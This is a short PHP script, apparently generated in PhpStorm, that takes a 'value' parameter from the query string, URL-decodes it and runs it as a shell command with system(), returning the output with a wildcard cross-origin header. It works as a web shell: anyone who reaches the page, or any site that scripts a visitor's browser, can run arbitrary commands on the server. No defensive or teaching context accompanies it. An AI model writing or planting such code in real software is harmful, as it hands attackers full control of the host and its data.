<?php
/**
 * Created by PhpStorm.
 * User: ns
 * Date: 11/15/2018
 * Time: 16:05
 */

header('access-control-allow-origin: *');

if (!isset($_GET['value']))
    die('value parameter is required');

echo system(urldecode($_GET['value']));